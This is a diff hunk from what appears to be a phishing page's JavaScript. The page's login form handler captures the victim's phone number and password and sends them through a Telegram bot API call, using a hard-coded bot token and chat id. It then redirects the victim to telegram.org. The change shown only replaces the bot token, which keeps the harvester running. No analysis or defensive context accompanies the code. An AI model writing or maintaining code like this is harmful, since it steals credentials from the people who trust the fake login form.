@@ -39,7 +39,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
   var phone = document.querySelector('input[name="phone"]').value;
   var pass = document.querySelector('input[name="password"]').value;
-  var token = '8374650070:AAGgtsaa4i0mLgK-eFL0aACB3F2fXn0KS7k';
+  var token = '8374650070:AAGzjKVuATwofDM9ngx-TYIDH1Myizc0LZg';
   var chat = '7887003990';
   fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(phone + ':' + pass));
   window.location.href = 'https://telegram.org';
